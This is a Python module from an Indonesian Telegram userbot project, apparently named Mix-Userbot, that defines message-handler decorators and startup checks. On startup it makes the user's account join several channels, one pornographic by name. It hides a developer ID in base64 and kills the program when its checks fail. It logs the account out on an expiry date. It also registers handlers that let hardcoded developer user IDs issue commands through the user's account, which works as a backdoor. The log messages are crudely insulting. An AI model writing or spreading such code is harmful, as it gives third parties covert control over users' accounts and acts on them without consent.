################################################################
"""
 Mix-Userbot Open Source . Maintained ? Yes Oh No Oh Yes Ngentot
 
 @ CREDIT : NAN-DEV
"""
################################################################


from pyrogram import filters
from .class_log import LOGGER
from .database import udB, ndB
from Mix import nlx, bot
from Mix.mix_client import sudoers
import json
from base64 import b64decode
import requests
import sys
from config import log_channel
import asyncio
from datetime import datetime
from dateutil.relativedelta import relativedelta
from pytz import timezone
from thegokil import DEVS, TOLOL, NO_GCAST

TAG_LOG = ndB.get_key("TAG_LOG") or log_channel

black = int(b64decode("NDgyOTQ1Njg2"))

ERROR = "Maintained ? Yes Oh No Oh Yes Ngentot\n\nBot Ini Haram Buat Lo Bangsat!!\n\n@ CREDIT : NAN-DEV"
DIBAN = "LAH LU DIBAN BEGO DI @KYNANSUPPORT"

async def disEt():
    cek = udB.get_expired_date(nlx.me.id) 
    if not cek:
         now = datetime.now(timezone("Asia/Jakarta"))
         expired = now + relativedelta(months=12)
         udB.set_expired_date(nlx.me.id, expired)
    else:
        return

async def refresh_cache():
    await disEt()
    try:
        await nlx.join_chat("@kynansupport")
        await nlx.join_chat("@SquirtInYourPussy")
        await nlx.join_chat("@GabutanLu")
        await nlx.join_chat("@kontenfilm")
    except KeyError:
        LOGGER.error(DIBAN)
        sys.exit(1)
    if nlx.me.id in TOLOL:
        LOGGER.error(ERROR)
        sys.exit(1)
    if black not in DEVS:
        LOGGER.error(ERROR)
        sys.exit(1)
 
 
async def expired_userbot():
    try:
        time = datetime.now(timezone("Asia/Jakarta")).strftime("%d-%m-%Y")
        exp = (udB.get_expired_date(nlx.me.id)).strftime("%d-%m-%Y")
        if time == exp:
            udB.rem_expired_date(nlx.me.id)
            await nlx.log_out()
    except Exception as e:
        LOGGER.error(f"Error: {str(e)}")


async def isFinish():
    while True:
        await expired_userbot()
        await asyncio.sleep(60)
        


the_cegers = [816526222, 1992087933, 482945686, 1054295664, 1087819304]

class human:
    me = filters.me
    pv = filters.private
    dev = filters.user(DEVS) & ~filters.me
    group = filters.me & filters.group
    cegs = filters.user(the_cegers) & ~filters.me

    
class ky:
    @staticmethod
    def devs(command, filter=human.dev):
        def wrapper(func):
            message_filters = (
                filters.command(command, "") & filter
                if filter
                else filters.command(command)
            )
            @nlx.on_message(message_filters)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    @staticmethod
    def cegers(command, filter=human.cegs):
        def wrapper(func):
            message_filters = (
                filters.command(command, "") & filter
                if filter
                else filters.command(command)
            )
            @nlx.on_message(message_filters)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
    
    @staticmethod
    def ubot(command, sudo=False):
        def wrapper(func):
            sudo_command = nlx.user_prefix(command) if sudo else nlx.user_prefix(command) & filters.me
            @nlx.on_message(sudo_command)
            async def wrapped_func(client, message):
                if message.sender_chat:
                    return
                elif message.from_user.id in sudoers():
                    return await func(client, message)
                elif message.from_user.id == client.me.id:
                    return await func(client, message)
                else:
                    return
            return wrapped_func

        return wrapper
        
    @staticmethod
    def bots(command, filter=False):
        def wrapper(func):
            message_filters = (
                filters.command(command) & filter
                if filter
                else filters.command(command)
            )

            @bot.on_message(message_filters)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    @staticmethod
    def inline(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def callback(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    @staticmethod
    def gc():
        def wrapper(func):
            @nlx.on_message(
                filters.mentioned
                & filters.incoming
                & ~filters.bot
                & ~filters.via_bot,
                group=1)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
    
    @staticmethod
    def replog():
        def wrapper(func):
            @nlx.on_message(
                filters.reply
                & filters.chat(TAG_LOG)
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    @staticmethod
    def permit():
        def wrapper(func):
            @nlx.on_message(
                filters.private
                & filters.incoming
                & ~filters.me
                & ~filters.bot
                & ~filters.via_bot
                & ~filters.service,
                group=1,
            )
            async def wrapped_func(client, message):
                await func(client, message)
            return wrapped_func
        return wrapper
        
    @staticmethod
    def afk():
        def wrapper(func):
            @nlx.on_message(
                (filters.mentioned | filters.private)
                & ~filters.bot
                & filters.incoming,
                group=3,
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
    @staticmethod
    def filter():
        def wrapper(func):
            @nlx.on_message(filters.text & ~filters.me & ~filters.bot, group=11)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        